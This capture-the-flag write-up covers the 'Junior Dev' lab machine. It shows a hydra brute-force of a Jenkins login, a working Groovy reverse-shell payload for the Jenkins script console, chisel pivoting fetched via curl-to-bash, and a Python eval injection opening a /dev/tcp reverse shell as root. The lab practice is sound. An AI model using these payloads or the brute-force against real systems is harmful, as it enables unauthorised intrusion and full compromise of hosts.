# Junior Dev

***
## Difficulty = Medium

![image](https://github.com/sec-fortress/sec-fortress.github.io/assets/132317714/cd3ad44f-1954-4968-91ef-3fd8d3b06b12)

***


Running our nmap scan we have :


```bash
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-23 20:57 EDT
Nmap scan report for 10.150.150.38
Host is up (0.21s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 64:63:02:cb:00:44:4a:0f:95:1a:34:8d:4e:60:38:1c (RSA)
|   256 0a:6e:10:95:de:3d:6d:4b:98:5f:f0:cf:cb:f5:79:9e (ECDSA)
|_  256 08:04:04:08:51:d2:b4:a4:03:bb:02:71:2f:66:09:69 (ED25519)
30609/tcp open  http    Jetty 9.4.27.v20200227
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
| http-robots.txt: 1 disallowed entry 
|_/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.85 seconds
nmap -p22,30609 -sCV 10.150.150.38
```


Nice, decided to check port `22/SSH` if there are any banners


![](https://i.imgur.com/BLyzO03.png)


Cool, No banners, let check out the port running on `30609/HTTP`


![](https://i.imgur.com/wXYfe9k.png)

We have a login page, Trying out **directory bruteforce** , i found some endpoints but they where not all worth it (Rabbit holes 🐇)

![](https://i.imgur.com/iQXXFe1.png)

Well i navigated to `/robots.txt` and we have this message - **"# we don't want robots to click "build" links"**, Looks like a clue to something 🤔

![](https://i.imgur.com/NGHmO0U.png)


I decided to **view-page source** of the Jenkins login page and i saw this particular [**"action="j_acegi_security_check"**](https://community.jaspersoft.com/questions/514519/about-acegi) which is more of like an entry point for authentication



![](https://i.imgur.com/vZLZE3i.png)



So i decided to take a look at this tryhackme forum [discussion](https://tryhackme.com/forum/thread/630f5aa391a3470044dd86f1) which led me to bruteforcing the login page with hydra, using the following syntax


```bash
$ hydra 10.150.150.38 -s 30609 -l admin -P /usr/share/wordlists/rockyou.txt  -V http-form-post '/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in&Login=Logi
n:F=Invalid username or password'
```



**_Output :_**


![](https://i.imgur.com/1k9OoPk.png)


Now that we have Username and Password, we can go ahead and login


![](https://i.imgur.com/cxJ5DTw.png)


Next, Navigate to **Manage Jenkins** on the side menu bar

![](https://i.imgur.com/Vv198jR.png)

Scroll down and select select **Script console**

![](https://i.imgur.com/3Y43Y7Z.png)

Now start up your `netcat` listener on port `8044` and paste in this payload on the console and click **Run**


```
String host="10.66.66.246";
int port=8044;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

You should get your reverse shell back as **Jenkins**

![](https://i.imgur.com/m2N0Tcb.png)


### **Pivoting**

After much enumeration on finding password in config files, SUID, SUDO, capabilities etc nothing was found but running `netstat -ant` gives us a port `8080` listening on `127.0.0.1`

![](https://i.imgur.com/ZetKJio.png)


- Download chisel with following command

```bash
$ curl https://i.jpillora.com/chisel! | bash
```

- Send it to our target using `python` and `wget`

```bash
# Attacker
$ python3 -m http.server 80

# Target
$ wget ATTACKER-IP/chisel
```


- Now on attacker's machine start up chisel with the following command

```bash
$ chmod +x chisel
$ ./chisel server -p 8001 --reverse
```

- On target machine start up chisel with

```bash
$ chmod +x chisel
$ ./chisel client ATTACKER-IP:8001 R:8080:127.0.0.1:8080
```


![](https://i.imgur.com/80FEBaK.png)


Now we can navigate to `http://127.0.0.1:8080` on our browser and we have this :


![](https://i.imgur.com/HY7B7rK.png)


**Viewing Page-Source** we have a commented `img` tag


![](https://i.imgur.com/I6C8iH8.png)



Navigating to `/static/FLAG.png` we have **FLAG71**



![](https://i.imgur.com/jzLMFxs.png)



### **Privilege Escalation**

Running [pspy](https://github.com/DominicBreuker/pspy) on our target system we have a root process that is actively running at the server side of the website, `http://127.0.0.1:8080`

![](https://i.imgur.com/MI0Ar3z.png)


Immediately, my mind went to [**python command injection**](https://vk9-sec.com/exploiting-python-eval-code-injection/) since this process is running a file called `untitled.py` with `/usr/bin/python`, we can then -:

- start up our listener

```bash
$ nc -lvnp 3000
```

- Inject the python payload in the first box on the website to get reverse shell


```python
__import__('os').system('bash -c "bash -i >& /dev/tcp/10.66.66.246/3000 0>&1" ')#
```


Then we got reverse shell as user **root**


![](https://i.imgur.com/Ck88NLU.png)




### **_Things i would take note of :_**



- First of all **pivoting** isn't new to me, except for the fact that i had to edit my `/etc/proxychains4.conf` file in other to be able to have access to that specific port, Over here we just accessed it directly because we forwarded traffic from the local port `8080` on our machine to port `8080` on our attacker machine with the IP address `127.0.0.1` (localhost).

- Secondly, **Python Command Injection** seems new to me here and took me hours before i could figure it out, i once did something like this but never knew it was python command injection, it consists of using the `eval` built-in function which takes a single argument and can be a powerful tool for dynamic code execution.



**Have Fun**


![](https://media.tenor.com/qsdqhlumpMYAAAAC/anime-bankai.gif)



<button onclick="window.location.href='https://sec-fortress.github.io';">Back To Home螥</button>


